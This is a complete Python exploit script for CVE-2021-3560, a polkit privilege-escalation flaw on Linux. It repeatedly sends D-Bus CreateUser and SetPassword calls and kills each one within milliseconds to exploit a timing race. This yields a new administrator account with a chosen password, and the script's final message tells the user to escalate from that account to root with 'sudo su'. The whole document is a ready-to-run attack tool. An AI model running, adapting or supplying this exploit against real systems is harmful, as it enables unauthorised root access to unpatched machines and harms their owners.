#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import random
import pwd
import argparse



parser = argparse.ArgumentParser(description="Privilege escalation with polkit - CVE-2021-3560. " \
    "Exploit code written by Ahmad Almorabea @almorabea and improved by @tigre-bleu. " \
    "Original exploit author: Kevin Backhouse. " \
    "For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/")
parser.add_argument("-u", "--user", help="user to create (default=cyblex)", default="cyblex")
parser.add_argument("-p", "--password", help="password for the new user (default=cyblex)", default="cyblex")
parser.add_argument("-d", "--description", help="description for the new user", default="Account created via CVE-2021-3560 exploit")
args = parser.parse_args()

print("[+] Starting the Exploit ")
time.sleep(3)

check = True
counter = 0
while check:
        counter = counter +1
        process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply','/org/freedesktop/Accounts','org.freedesktop.Accounts.CreateUser','string:' + args.user,'string:"' + args.description,'int32:1'])
        try:
                #print('1 - Running in process', process.pid)
                Random = random.uniform(0.006,0.009)
                process.wait(timeout=Random)
                process.kill()
        except subprocess.TimeoutExpired:
                #print('Timed out - killing', process.pid)
                process.kill()

        user = subprocess.run(['id', args.user], stdout=subprocess.PIPE).stdout.decode('utf-8')
        if user.find("uid") != -1:
                print("[+] User Created with the name of " + args.user)
                print("[+] Timed out at: "+str(Random))
                check =False
                break
        if counter > 2000:
                print("[-] Couldn't add the user, try again it may work")
                sys.exit(0)


for i in range(200):
        #print(i)
        uid = "/org/freedesktop/Accounts/User"+str(pwd.getpwnam(args.user).pw_uid)
        res = subprocess.run(['openssl', 'passwd','-5', args.password], stdout=subprocess.PIPE).stdout.decode('utf-8')
        password_hash = res.rstrip()
        process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply',uid,'org.freedesktop.Accounts.User.SetPassword','string:' + password_hash, 'string:GoldenEye'])
        try:
                #print('1 - Running in process', process.pid)
                Random = random.uniform(0.006,0.009)
                process.wait(timeout=Random)
                process.kill()
        except subprocess.TimeoutExpired:
                #print('Timed out - killing', process.pid)
                process.kill()

print("[+] Timed out at: " + str(Random))
print("[+] Exploit Completed, Your new user is '" + args.user + "' just log into it like, 'su " + args.user + "' using password '" + args.password + "', and then 'sudo su' to root ")
